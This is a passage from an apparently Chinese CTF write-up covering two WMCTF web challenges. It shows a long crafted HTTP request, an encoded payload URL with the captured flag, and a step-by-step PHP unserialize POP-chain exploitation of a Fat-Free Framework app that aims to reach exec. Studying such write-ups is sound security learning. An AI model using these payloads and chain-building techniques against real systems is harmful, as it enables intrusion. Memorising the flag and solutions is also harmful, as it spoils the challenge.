=&amp;cZ=&amp;c0=&amp;c1=&amp;c2=&amp;c3=&amp;c4=&amp;c5=&amp;c6=&amp;c7=&amp;c8=&amp;c9=&amp;da=&amp;db=&amp;dc=&amp;dd=&amp;de=&amp;df=&amp;dg=&amp;dh=&amp;di=&amp;dj=&amp;dk=&amp;dl=&amp;dm=&amp;dn=&amp;do=&amp;dp=&amp;dq=&amp;dr=&amp;ds=&amp;dt=&amp;du=&amp;dv=&amp;dw=&amp;dx=&amp;dy=&amp;dz=&amp;dA=&amp;dB=&amp;dC=&amp;dD=&amp;dE=&amp;dF=&amp;dG=&amp;dH=&amp;dI=&amp;dJ=&amp;dK=&amp;dL=&amp;dM=&amp;dN=&amp;dO=&amp;dP=&amp;dQ=&amp;dR=&amp;dS=&amp;dT=&amp;dU=&amp;dV=&amp;dW=&amp;dX=&amp;dY=&amp;dZ=&amp;d0=&amp;d1=&amp;d2=&amp;d3=&amp;d4=&amp;d5=&amp;d6=&amp;d7=&amp;d8=&amp;d9=&amp;ea=&amp;eb=&amp;ec=&amp;ed=&amp;ee=&amp;ef=&amp;eg=&amp;eh=&amp;ei=&amp;ej=&amp;ek=&amp;el=&amp;em=&amp;en=&amp;eo=&amp;ep=&amp;eq=&amp;er=&amp;es=&amp;et=&amp;eu=&amp;ev=&amp;ew=&amp;ex=&amp;ey=&amp;ez=&amp;eA=&amp;eB=&amp;eC=&amp;eD=&amp;eE=&amp;eF=&amp;eG=&amp;eH=&amp;eI=&amp;eJ=&amp;eK=&amp;eL=&amp;eM=&amp;eN=&amp;eO=&amp;eP=&amp;eQ=&amp;eR=&amp;eS=&amp;eT=&amp;eU=&amp;eV=&amp;eW=&amp;eX=&amp;eY=&amp;eZ=&amp;e0=&amp;e1=&amp;e2=&amp;e3=&amp;e4=&amp;e5=&amp;e6=&amp;e7=&amp;e8=&amp;e9=&amp;fa=&amp;fb=&amp;fc=&amp;fd=&amp;fe=&amp;ff=&amp;fg=&amp;fh=&amp;fi=&amp;fj=&amp;fk=&amp;fl=&amp;fm=&amp;fn=&amp;fo=&amp;fp=&amp;fq=&amp;fr=&amp;fs=&amp;ft=&amp;fu=&amp;fv=&amp;fw=&amp;fx=&amp;fy=&amp;fz=&amp;fA=&amp;fB=&amp;fC=&amp;fD=&amp;fE=&amp;fF=&amp;fG=&amp;fH=&amp;fI=&amp;fJ=&amp;fK=&amp;fL=&amp;fM=&amp;fN=&amp;fO=&amp;fP=&amp;fQ=&amp;fR=&amp;fS=&amp;fT=&amp;fU=&amp;fV=&amp;fW=&amp;fX=&amp;fY=&amp;fZ=&amp;f0=&amp;f1=&amp;f2=&amp;f3=&amp;f4=&amp;f5=&amp;f6=&amp;f7=&amp;f8=&amp;f9=&amp;ga=&amp;gb=&amp;gc=&amp;gd=&amp;ge=&amp;gf=&amp;gg=&amp;gh=&amp;gi=&amp;gj=&amp;gk=&amp;gl=&amp;gm=&amp;gn=&amp;go=&amp;gp=&amp;gq=&amp;gr=&amp;gs=&amp;gt=&amp;gu=&amp;gv=&amp;gw=&amp;gx=&amp;gy=&amp;gz=&amp;gA=&amp;gB=&amp;gC=&amp;gD=&amp;gE=&amp;gF=&amp;gG=&amp;gH=&amp;gI=&amp;gJ=&amp;gK=&amp;gL=&amp;gM=&amp;gN=&amp;gO=&amp;gP=&amp;gQ=&amp;gR=&amp;gS=&amp;gT=&amp;gU=&amp;gV=&amp;gW=&amp;gX=&amp;gY=&amp;gZ=&amp;g0=&amp;g1=&amp;g2=&amp;g3=&amp;g4=&amp;g5=&amp;g6=&amp;g7=&amp;g8=&amp;g9=&amp;ha=&amp;hb=&amp;hc=&amp;hd=&amp;he=&amp;hf=&amp;hg=&amp;hh=&amp;hi=&amp;hj=&amp;hk=&amp;hl=&amp;hm=&amp;hn=&amp;ho=&amp;hp=&amp;hq=&amp;hr=&amp;hs=&amp;ht=&amp;hu=&amp;hv=&amp;hw=&amp;hx=&amp;hy=&amp;hz=&amp;hA=&amp;hB=&amp;hC=&amp;hD=&amp;hE=&amp;hF=&amp;hG=&amp;hH=&amp;hI=&amp;hJ=&amp;hK=&amp;hL=&amp;hM=&amp;hN=&amp;hO=&amp;hP=&amp;hQ=&amp;hR=&amp;hS=&amp;hT=&amp;hU=&amp;hV=&amp;hW=&amp;hX=&amp;hY=&amp;hZ=&amp;h0=&amp;h1=&amp;h2=&amp;h3=&amp;h4=&amp;h5=&amp;h6=&amp;h7=&amp;h8=&amp;h9=&amp;ia=&amp;ib=&amp;ic=&amp;id=&amp;ie=&amp;if=&amp;ig=&amp;ih=&amp;ii=&amp;ij=&amp;ik=&amp;il=&amp;im=&amp;in=&amp;io=&amp;ip=&amp;iq=&amp;ir=&amp;is=&amp;it=&amp;iu=&amp;iv=&amp;iw=&amp;ix=&amp;iy=&amp;iz=&amp;iA=&amp;iB=&amp;iC=&amp;iD=&amp;iE=&amp;iF=&amp;iG=&amp;iH=&amp;iI=&amp;iJ=&amp;iK=&amp;iL=&amp;iM=&amp;iN=&amp;iO=&amp;iP=&amp;iQ=&amp;iR=&amp;iS=&amp;iT=&amp;iU=&amp;iV=&amp;iW=&amp;iX=&amp;iY=&amp;iZ=&amp;i0=&amp;i1=&amp;i2=&amp;i3=&amp;i4=&amp;i5=&amp;i6=&amp;i7=&amp;i8=&amp;i9=&amp;ja=&amp;jb=&amp;jc=&amp;jd=&amp;je=&amp;jf=&amp;jg=&amp;jh=&amp;ji=&amp;jj=&amp;jk=&amp;jl=&amp;jm=&amp;jn=&amp;jo=&amp;jp=&amp;jq=&amp;jr=&amp;js=&amp;jt=&amp;ju=&amp;jv=&amp;jw=&amp;jx=&amp;jy=&amp;jz=&amp;jA=&amp;jB=&amp;jC=&amp;jD=&amp;jE=&amp;jF=&amp;jG=&amp;jH=&amp;jI=&amp;jJ=&amp;jK=&amp;jL=&amp;jM=&amp;jN=&amp;jO=&amp;jP=&amp;jQ=&amp;jR=&amp;jS=&amp;jT=&amp;jU=&amp;jV=&amp;jW=&amp;jX=&amp;jY=&amp;jZ=&amp;j0=&amp;j1=&amp;j2=&amp;j3=&amp;j4=&amp;j5=&amp;j6=&amp;j7=&amp;j8=&amp;j9=&amp;ka=&amp;kb=&amp;kc=&amp;kd=&amp;ke=&amp;kf=&amp;kg=&amp;kh=&amp;ki=&amp;kj=&amp;kk=&amp;kl=&amp;km=&amp;kn=&amp;ko=&amp;kp=&amp;kq=&amp;kr=&amp;ks=&amp;kt=&amp;ku=&amp;kv=&amp;kw=&amp;kx=&amp;ky=&amp;kz=&amp;kA=&amp;kB=&amp;kC=&amp;kD=&amp;kE=&amp;kF=&amp;kG=&amp;kH=&amp;kI=&amp;kJ=&amp;kK=&amp;kL=&amp;kM=&amp;kN=&amp;kO=&amp;kP=&amp;kQ=&amp;kR=&amp;kS=&amp;kT=&amp;kU=&amp;kV=&amp;kW=&amp;kX=&amp;kY=&amp;kZ=&amp;k0=&amp;k1=&amp;k2=&amp;k3=&amp;k4=&amp;k5=&amp;k6=&amp;k7=&amp;k8=&amp;k9=&amp;la=&amp;lb=&amp;lc=&amp;ld=&amp;le=&amp;lf=&amp;lg=&amp;lh=&amp;li=&amp;lj=&amp;lk=&amp;ll=&amp;lm=&amp;ln=&amp;lo=&amp;lp=&amp;lq=&amp;lr=&amp;ls=&amp;lt=&amp;lu=&amp;lv=&amp;lw=&amp;lx=&amp;ly=&amp;lz=&amp;lA=&amp;lB=&amp;lC=&amp;lD=&amp;lE=&amp;lF=&amp;lG=&amp;lH=&amp;lI=&amp;lJ=&amp;lK=&amp;lL=&amp;lM=&amp;lN=&amp;lO=&amp;lP=&amp;lQ=&amp;lR=&amp;lS=&amp;lT=&amp;lU=&amp;lV=&amp;lW=&amp;lX=&amp;lY=&amp;lZ=&amp;l0=&amp;l1=&amp;l2=&amp;l3=&amp;l4=&amp;l5=&amp;l6=&amp;l7=&amp;l8=&amp;l9=&amp;ma=&amp;mb=&amp;mc=&amp;md=&amp;me=&amp;mf=&amp;mg=&amp;mh=&amp;mi=&amp;mj=&amp;mk=&amp;ml=&amp;mm=&amp;mn=&amp;mo=&amp;mp=&amp;mq=&amp;mr=&amp;ms=&amp;mt=&amp;mu=&amp;mv=&amp;mw=&amp;mx=&amp;my=&amp;mz=&amp;mA=&amp;mB=&amp;mC=&amp;mD=&amp;mE=&amp;mF=&amp;mG=&amp;mH=&amp;mI=&amp;mJ=&amp;mK=&amp;mL=&amp;mM=&amp;mN=&amp;mO=&amp;mP=&amp;mQ=&amp;mR=&amp;mS=&amp;mT=&amp;mU=&amp;mV=&amp;mW=&amp;mX=&amp;mY=&amp;mZ=&amp;m0=&amp;m1=&amp;m2=&amp;m3=&amp;m4=&amp;m5=&amp;m6=&amp;m7=&amp;m8=&amp;m9=&amp;na=&amp;nb=&amp;nc=&amp;nd=&amp;ne=&amp;nf=&amp;ng=&amp;nh=&amp;ni=&amp;nj=&amp;nk=&amp;nl=&amp;nm=&amp;nn=&amp;no=&amp;np=&amp;nq=&amp;nr=&amp;ns=&amp;nt=&amp;nu=&amp;nv=&amp;nw=&amp;nx=&amp;ny=&amp;nz=&amp;nA=&amp;nB=&amp;nC=&amp;nD=&amp;nE=&amp;nF=&amp;nG=&amp;nH=&amp;nI=&amp;nJ=&amp;nK=&amp;nL=&amp;nM=&amp;nN=&amp;nO=&amp;nP=&amp;nQ=&amp;nR=&amp;nS=&amp;nT=&amp;nU=&amp;nV=&amp;nW=&amp;nX=&amp;nY=&amp;nZ=&amp;n0=&amp;n1=&amp;n2=&amp;n3=&amp;n4=&amp;n5=&amp;n6=&amp;n7=&amp;n8=&amp;n9=&amp;oa=&amp;ob=&amp;oc=&amp;od=&amp;oe=&amp;of=&amp;og=&amp;oh=&amp;oi=&amp;oj=&amp;ok=&amp;ol=&amp;om=&amp;on=&amp;oo=&amp;op=&amp;oq=&amp;or=&amp;os=&amp;ot=&amp;ou=&amp;ov=&amp;ow=&amp;ox=&amp;oy=&amp;oz=&amp;oA=&amp;oB=&amp;oC=&amp;oD=&amp;oE=&amp;oF=&amp;oG=&amp;oH=&amp;oI=&amp;oJ=&amp;oK=&amp;oL=&amp;oM=&amp;oN=&amp;oO=&amp;oP=&amp;oQ=&amp;oR=&amp;oS=&amp;oT=&amp;oU=&amp;oV=&amp;oW=&amp;oX=&amp;oY=&amp;oZ=&amp;o0=&amp;o1=&amp;o2=&amp;o3=&amp;o4=&amp;o5=&amp;o6=&amp;o7=&amp;o8=&amp;o9=&amp;pa=&amp;pb=&amp;pc=&amp;pd=&amp;pe=&amp;pf=&amp;pg=&amp;ph=&amp;pi=&amp;pj=&amp;pk=&amp;pl=&amp;pm=&amp;pn=&amp;po=&amp;pp=&amp;pq=&amp;pr=&amp;ps=&amp;pt=&amp;pu=&amp;pv=&amp;pw=&amp;px=&amp;py=&amp;pz=&amp;pA=&amp;pB=&amp;pC=&amp;pD=&amp;pE=&amp;pF=&amp;pG=&amp;pH=&amp;pI=&amp;pJ=&amp;pK=&amp;pL=&amp;pM=&amp;pN=&amp;pO=&amp;pP=&amp;pQ=&amp;pR=&amp;pS=&amp;pT=&amp;pU=&amp;pV=&amp;pW=&amp;pX=&amp;pY=&amp;pZ=&amp;p0=&amp;p1=&amp;p2=&amp;p3=&amp;p4=&amp;p5=&amp;p6=&amp;p7=&amp;p8=&amp;p9=&amp;qa=&amp;qb=&amp;qc=&amp;qd=&amp;qe=&amp;qf=&amp;qg=&amp;qh=&amp;qi=&amp;qj=&amp;qk=&amp;ql=&amp;qm=&amp;qn=&amp;qo=&amp;qp=&amp;qq=&amp;qr=&amp;qs=&amp;qt=&amp;qu=&amp;qv=&amp;qw=&amp;qx=&amp;qy=&amp;qz=&amp;qA=&amp;qB=&amp;qC=&amp;qD=&amp;qE=&amp;qF=&amp;qG=&amp;qH=&amp;qI=&amp;qJ=&amp;qK=&amp;qL=&amp;qM=&amp;qN=&amp;qO=&amp;qP=&amp;qQ=&amp;qR=&amp;qS=&amp;qT=&amp;qU=&amp;qV=&amp;qW=&amp;qX=&amp;qY=&amp;qZ=&amp;q0=&amp;q1=&amp;q2=&amp;q3=&amp;q4=&amp;q5=&amp;q6=&amp;q7=&amp;q8=&amp;q9=&amp;ra=&amp;rb=&amp;rc=&amp;rd=&amp;re=&amp;rf=&amp;rg=&amp;rh=&amp;ri=&amp;rj=&amp;rk=&amp;rl=&amp;rm=&amp;rn=&amp;ro=&amp;rp=&amp;rq=&amp;rr=&amp;rs=&amp;rt=&amp;ru=&amp;rv=&amp;rw=&amp;rx=&amp;ry=&amp;rz=&amp;rA=&amp;rB=&amp;rC=&amp;rD=&amp;rE=&amp;rF=&amp;rG=&amp;rH=&amp;rI=&amp;rJ=&amp;rK=&amp;rL=&amp;rM=&amp;rN=&amp;rO=&amp;rP=&amp;rQ=&amp;rR=&amp;rS=&amp;rT=&amp;rU=&amp;rV=&amp;rW=&amp;rX=&amp;rY=&amp;rZ=&amp;r0=&amp;r1=&amp;r2=&amp;r3=&amp;r4=&amp;r5=&amp;r6=&amp;r7=&amp;r8=&amp;r9=&amp;sa=&amp;sb=&amp;sc=&amp;sd=&amp;se=&amp;sf=&amp;sg=&amp;sh=&amp;si=&amp;sj=&amp;sk=&amp;sl=&amp;sm=&amp;sn=&amp;so=&amp;sp=&amp;sq=&amp;sr=&amp;ss=&amp;st=&amp;su=&amp;sv=&amp;sw=&amp;sx=&amp;sy=&amp;sz=&amp;sA=&amp;sB=&amp;sC=&amp;sD=&amp;sE=&amp;sF=&amp;sG=&amp;sH=&amp;sI=&amp;sJ=&amp;sK=&amp;sL=&amp;sM=&amp;sN=&amp;sO=&amp;sP=&amp;sQ=&amp;sR=&amp;sS=&amp;sT=&amp;sU=&amp;sV=&amp;sW=&amp;sX=&amp;sY=&amp;sZ=&amp;s0=&amp;s1=&amp;s2=&amp;s3=&amp;s4=&amp;s5=&amp;s6=&amp;s7=&amp;s8=&amp;s9=&amp;ta=&amp;tb=&amp;tc=&amp;td=&amp;te=&amp;tf=&amp;tg=&amp;th=&amp;ti=&amp;tj=&amp;tk=&amp;tl=&amp;tm=&amp;tn=&amp;to=&amp;tp=&amp;tq=&amp;tr=&amp;ts=&amp;tt=&amp;tu=&amp;tv=&amp;tw=&amp;tx=&amp;ty=&amp;tz=&amp;tA=&amp;tB=&amp;tC=&amp;tD=&amp;tE=&amp;tF=&amp;tG=&amp;tH=&amp;tI=&amp;tJ=&amp;tK=&amp;tL=&amp;tM=&amp;tN=&amp;tO=&amp;tP=&amp;tQ=&amp;tR=&amp;tS=&amp;tT=&amp;tU=&amp;tV=&amp;tW=&amp;tX=&amp;tY=&amp;tZ=&amp;t0=&amp;t1=&amp;t2=&amp;t3=&amp;t4=&amp;t5=&amp;t6=&amp;t7=&amp;t8=&amp;t9=&amp;ua=&amp;ub=&amp;uc=&amp;ud=&amp;ue=&amp;uf=&amp;ug=&amp;uh=&amp;ui=&amp;uj=&amp;uk=&amp;ul=&amp;um=&amp;un=&amp;uo=&amp;up=&amp;uq=&amp;ur=&amp;us=&amp;ut=&amp;uu=&amp;uv=&amp;uw=&amp;ux=&amp;uy=&amp;uz=&amp;uA=&amp;uB=&amp;uC=&amp;uD=&amp;uE=&amp;uF=&amp;uG=&amp;uH=&amp;uI=&amp;uJ=&amp;uK=&amp;uL=&amp;uM=&amp;uN=&amp;uO=&amp;uP=&amp;uQ=&amp;uR=&amp;uS=&amp;uT=&amp;uU=&amp;uV=&amp;uW=&amp;uX=&amp;uY=&amp;uZ=&amp;u0=&amp;u1=&amp;u2=&amp;u3=&amp;u4=&amp;u5=&amp;u6=&amp;u7=&amp;u8=&amp;u9=&amp;va=&amp;vb=&amp;vc=&amp;vd=&amp;ve=&amp;vf=&amp;vg=&amp;vh=&amp;vi=&amp;vj=&amp;vk=&amp;vl=&amp;vm=&amp;vn=&amp;vo=&amp;vp=&amp;vq=&amp;vr=&amp;vs=&amp;vt=&amp;vu=&amp;vv=&amp;vw=&amp;vx=&amp;vy=&amp;vz=&amp;vA=&amp;vB=&amp;vC=&amp;vD=&amp;vE=&amp;vF=&amp;vG=&amp;vH=&amp;vI=&amp;vJ=&amp;vK=&amp;vL=&amp;vM=&amp;vN=&amp;vO=&amp;vP=&amp;vQ=&amp;vR=&amp;vS=&amp;vT=&amp;vU=&amp;vV=&amp;vW=&amp;vX=&amp;vY=&amp;vZ=&amp;v0=&amp;v1=&amp;v2=&amp;v3=&amp;v4=&amp;v5=&amp;v6=&amp;v7=&amp;v8=&amp;v9=&amp;wa=&amp;wb=&amp;wc=&amp;wd=&amp;we=&amp;wf=&amp;wg=&amp;wh=&amp;wi=&amp;wj=&amp;wk=&amp;wl=&amp;wm=&amp;wn=&amp;wo=&amp;wp=&amp;wq=&amp;wr=&amp;ws=&amp;wt=&amp;wu=&amp;wv=&amp;ww=&amp;wx=&amp;wy=&amp;wz=&amp;wA=&amp;wB=&amp;wC=&amp;wD=&amp;wE=&amp;wF=&amp;wG=&amp;wH=&amp;wI=&amp;wJ=&amp;wK=&amp;wL=&amp;wM=&amp;wN=&amp;wO=&amp;wP=&amp;wQ=&amp;wR=&amp;wS=&amp;wT=&amp;wU=&amp;wV=&amp;wW=&amp;wX=&amp;wY=&amp;wZ=&amp;w0=&amp;w1=&amp;w2=&amp;w3=&amp;w4=&amp;w5=&amp;w6=&amp;w7=&amp;w8=&amp;w9=&amp;xa=&amp;xb=&amp;xc=&amp;xd=&amp;xe=&amp;xf=&amp;xg=&amp;xh=&amp;xi=&amp;xj=&amp;xk=&amp;xl=&amp;xm=&amp;xn=&amp;xo=&amp;xp=&amp;xq=&amp;xr=&amp;xs=&amp;xt=&amp;xu=&amp;xv=&amp;xw=&amp;xx=&amp;xy=&amp;xz=&amp;xA=&amp;xB=&amp;xC=&amp;xD=&amp;xE=&amp;xF=&amp;xG=&amp;xH=&amp;xI=&amp;xJ=&amp;xK=&amp;xL=&amp;xM=&amp;xN=&amp;xO=&amp;xP=&amp;xQ=&amp;xR=&amp;xS=&amp;xT=&amp;xU=&amp;xV=&amp;xW=&amp;xX=&amp;xY=&amp;xZ=&amp;x0=&amp;x1=&amp;x2=&amp;x3=&amp;x4=&amp;x5=&amp;x6=&amp;x7=&amp;x8=&amp;x9=&amp;ya=&amp;yb=&amp;yc=&amp;yd=&amp;ye=&amp;yf=&amp;yg=&amp;yh=&amp;yi=&amp;yj=&amp;yk=&amp;yl=&amp;ym=&amp;yn=&amp;yo=&amp;yp=&amp;yq=&amp;yr=&amp;ys=&amp;yt=&amp;yu=&amp;yv=&amp;yw=&amp;yx=&amp;yy=&amp;yz=&amp;yA=&amp;yB=&amp;yC=&amp;yD=&amp;yE=&amp;yF=&amp;yG=&amp;yH=&amp;yI=&amp;yJ=&amp;yK=&amp;yL=&amp;yM=&amp;yN=&amp;yO=&amp;yP=&amp;yQ=&amp;yR=&amp;yS=&amp;yT=&amp;yU=&amp;yV=&amp;yW=&amp;yX=&amp;yY=&amp;yZ=&amp;y0=&amp;y1=&amp;y2=&amp;y3=&amp;y4=&amp;y5=&amp;y6=&amp;y7=&amp;y8=&amp;y9=&amp;za=&amp;zb=&amp;zc=&amp;zd=&amp;ze=&amp;zf=&amp;zg=&amp;zh=&amp;zi=&amp;zj=&amp;zk=&amp;zl=&amp;zm=&amp;zn=&amp;zo=&amp;zp=&amp;zq=&amp;zr=&amp;zs=&amp;zt=&amp;zu=&amp;zv=&amp;zw=&amp;zx=&amp;zy=&amp;zz=&amp;zA=&amp;zB=&amp;zC=&amp;zD=&amp;zE=&amp;zF=&amp;zG=&amp;zH=&amp;zI=&amp;zJ=&amp;zK=&amp;zL=&amp;zM=&amp;zN=&amp;zO=&amp;zP=&amp;zQ=&amp;zR=&amp;zS=&amp;zT=&amp;zU=&amp;zV=&amp;zW=&amp;zX=&amp;zY=&amp;zZ=&amp;z0=&amp;z1=&amp;z2=&amp;z3=&amp;z4=&amp;z5=&amp;z6=&amp;z7=&amp;z8=&amp;z9=&amp;Aa=&amp;Ab=&amp;Ac=&amp;Ad=&amp;Ae=&amp;Af=&amp;Ag=&amp;Ah=&amp;Ai=&amp;Aj=&amp;Ak=&amp;Al=&amp;Am=&amp;An=&amp;Ao=&amp;Ap=&amp;Aq=&amp;Ar=&amp;As=&amp;At=&amp;Au=&amp;Av=&amp;Aw=&amp;Ax=&amp;Ay=&amp;Az=&amp;AA=&amp;AB=&amp;AC=&amp;AD=&amp;AE=&amp;AF=&amp;AG=&amp;AH=&amp;AI=&amp;AJ=&amp;AK=&amp;AL=&amp;AM=&amp;AN=&amp;AO=&amp;AP=&amp;AQ=&amp;AR=&amp;AS=&amp;AT=&amp;AU=&amp;AV=&amp;AW=&amp;AX=&amp;AY=&amp;AZ=&amp;A0=&amp;A1=&amp;A2=&amp;A3=&amp;A4=&amp;A5=&amp;A6=&amp;A7=&amp;A8=&amp;A9=&amp;Ba=&amp;Bb=&amp;Bc=&amp;Bd=&amp;Be=&amp;Bf=&amp;Bg=&amp;Bh=&amp;Bi=&amp;Bj=&amp;Bk=&amp;Bl=&amp;Bm=&amp;Bn=&amp;Bo=&amp;Bp=&amp;Bq=&amp;Br=&amp;Bs=&amp;Bt=&amp;Bu=&amp;Bv=&amp;Bw=&amp;Bx=&amp;By=&amp;Bz=&amp;BA=&amp;BB=&amp;BC=&amp;BD=&amp;BE=&amp;BF=&amp;BG=&amp;BH=&amp;BI=&amp;BJ=&amp;BK=&amp;BL=&amp;BM=&amp;BN=&amp;BO=&amp;BP=&amp;BQ=&amp;BR=&amp;BS=&amp;BT=&amp;BU=&amp;BV=&amp;BW=&amp;BX=&amp;BY=&amp;BZ=&amp;B0=&amp;B1=&amp;B2=&amp;B3=&amp;B4=&amp;B5=&amp;B6=&amp;B7=&amp;B8=&amp;B9=&amp;Ca=&amp;Cb=&amp;Cc=&amp;Cd=&amp;Ce=&amp;Cf=&amp;Cg=&amp;Ch=&amp;Ci=&amp;Cj=&amp;Ck=&amp;Cl=&amp;Cm=&amp;Cn=&amp;Co=&amp;Cp=&amp;Cq=&amp;Cr=&amp;Cs=&amp;Ct=&amp;Cu=&amp;Cv=&amp;Cw=&amp;Cx=&amp;Cy=&amp;Cz=&amp;CA=&amp;CB=&amp;CC=&amp;CD=&amp;CE=&amp;CF=&amp;CG=&amp;CH=&amp;CI=&amp;CJ=&amp;CK=&amp;CL=&amp;CM=&amp;CN=&amp;CO=&amp;CP=&amp;CQ=&amp;CR=&amp;CS=&amp;CT=&amp;CU=&amp;CV=&amp;CW=&amp;CX=&amp;CY=&amp;CZ=&amp;C0=&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;C9=&amp;Da=&amp;Db=&amp;Dc=&amp;Dd=&amp;De=&amp;Df=&amp;Dg=&amp;Dh=&amp;Di=&amp;Dj=&amp;Dk=&amp;Dl=&amp;Dm=&amp;Dn=&amp;Do=&amp;Dp=&amp;Dq=&amp;Dr=&amp;Ds=&amp;Dt=&amp;Du=&amp;Dv=&amp;Dw=&amp;Dx=&amp;Dy=&amp;Dz=&amp;DA=&amp;DB=&amp;DC=&amp;DD=&amp;DE=&amp;DF=&amp;DG=&amp;DH=&amp;DI=&amp;DJ=&amp;DK=&amp;DL=&amp;DM=&amp;DN=&amp;DO=&amp;DP=&amp;DQ=&amp;DR=&amp;DS=&amp;DT=&amp;DU=&amp;DV=&amp;DW=&amp;DX=&amp;DY=&amp;DZ=&amp;D0=&amp;D1=&amp;D2=&amp;D3=&amp;D4=&amp;D5=&amp;D6=&amp;D7=&amp;D8=&amp;D9=&amp;Ea=&amp;Eb=&amp;Ec=&amp;Ed=&amp;Ee=&amp;Ef=&amp;Eg=&amp;Eh=&amp;Ei=&amp;Ej=&amp;Ek=&amp;El=&amp;Em=&amp;En=&amp;Eo=&amp;Ep=&amp;Eq=&amp;Er=&amp;Es=&amp;Et=&amp;Eu=&amp;Ev=&amp;Ew=&amp;Ex=&amp;Ey=&amp;Ez=&amp;EA=&amp;EB=&amp;EC=&amp;ED=&amp;EE=&amp;EF=&amp;EG=&amp;EH=&amp;EI=&amp;EJ=&amp;EK=&amp;EL=&amp;EM=&amp;EN= HTTP/1.1</span><br><span class="line">Host: web_checkin2.wmctf.wetolink.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试发现，就如我们猜想的一样。</p>
<p>访问<code>http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code><br>拿到flag:<code>WMCTF&#123;3C5E9715-5BEE-4D33-8627-DE10E5D92715&#125;</code></p>
<h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>这题本地测试成功远程不行，不知道为啥，静等其他人的wp</p>
<p>代码很简单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">	trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line"><span class="variable">$f3</span>-&gt;config(<span class="string">&#x27;config.ini&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">	<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$f3</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;just get me a,don&#x27;t do anything else&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>又是一题反序列化</p>
<p>老规矩开局找入口点：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png" alt="image11496"></p>
<p>这里只有这一个入口点，这个入口点还挺不错的。</p>
<p>接下来我们可以考虑调用魔术方法或者是利用<code>$func($this)</code>来构造下一步</p>
<p>这里可以利用的魔术方法有：<code>__get</code>和<code>__call</code>，找了一波没啥好用的魔术方法，那么我们就利用<code>$func($this)</code>吧</p>
<p>接下来我们有两种思路：</p>
<ol>
<li>扩宽道路，就是找一个函数，里面调用有意思的方法的</li>
<li>确定pop链尾</li>
</ol>
<p>我这里是先扩宽反序列化的道路再去找链尾的，毕竟可以当链尾的太多了</p>
<p>慢慢找过去发现一个有意思的方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png" alt="image11818"></p>
<p>这里可以调用:<code>$func($url,false,true)</code>，如果我们能控制<code>$url</code>那么我们就能舒服多了，那么我们接下来就是要找个可以控制<code>$url</code>的地方</p>
<p>找着找着发现了<code>Base::run</code>这个方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>可以直接利用<code>$func($this);</code>来调用它（对于用户自定义的函数/方法，多一些参数没啥影响，但是对大部分自带的函数就不行了，原因估计是自带的函数都是c编写的固定参数的函数），我们来看下它调用<code>reroute</code>的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png" alt="image12152"></p>
<p>我们可以看到确实<code>$url</code>是我们可以控制的，现在就是要让语句执行到这里，这个没啥好说的，有耐心一点慢慢调就ok了，直接换上payload了：</p>
<p>接下来就是需要找到一个合适的函数，本地fuzz自带的函数发现，exec是可以的，虽然它会报错</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png" alt="image12361"></p>
<p>amazing，划重点这是要考的，虽然本地可以，但是</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png" alt="image12473"></p>
<p>服务器上去测试就segment fault了，黯然离去.jpg</p>
<p>接下来我们只能去找框架的函数了</p>
<p>找着找着我找到了：</p>
